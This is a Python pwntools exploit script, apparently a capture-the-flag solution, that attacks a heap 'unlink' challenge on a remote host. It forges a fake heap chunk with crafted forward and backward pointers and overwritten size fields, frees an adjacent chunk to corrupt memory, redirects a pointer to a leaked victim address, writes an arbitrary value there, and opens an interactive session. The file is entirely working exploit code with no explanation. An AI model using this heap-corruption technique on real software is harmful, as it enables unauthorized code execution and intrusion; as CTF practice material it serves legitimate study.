from pwn import *

def free(index):
    global r
    raw_input('debug free {}'.format(index))
    r.recvuntil('input:')
    r.sendline('0')
    r.recvuntil('x =')
    r.sendline(str(index))

def malloc(index):
    global r
    raw_input('debug malloc {}'.format(index))
    r.recvuntil('input:')
    r.sendline('1')
    r.recvuntil('x =')
    r.sendline(str(index))

def string(index, data):
    global r
    raw_input('debug string {} {}'.format(index, data))
    r.recvuntil('input:')
    r.sendline('2')
    r.recvuntil('x =')
    r.sendline(str(index))
    r.recvuntil('string =')
    r.sendline(data)

def show(index):
    global r
    raw_input('debug show {}'.format(index))
    r.recvuntil('input:')
    r.sendline('2')
    r.recvuntil('x =')
    r.sendline(str(index))

#r = process('./unlink')
r = remote('140.110.112.77', 9002)
raw_input('debug:')
victim = int(r.recvline().split(':')[1].strip()[2:], 16)
size = int(r.recvline().split(':')[1].strip()[2:], 16)
ary = int(r.recvline().split(':')[1].strip()[2:], 16)
print('victim: {}, size: {}, ary: {}'.format(hex(victim), hex(size), hex(ary)))

malloc(0)
malloc(1)
string(0, '\0' * 0x10 + p64(ary - 0x18) + p64(ary - 0x10) + '\0' * 0x60 + p64(0x80) + p64(0x90))
free(1)
string(0, '\0' * 0x18 + p64(victim))
string(0, p64(0xdeadbeef))
r.recvuntil('input:')
r.sendline('5')
r.interactive()
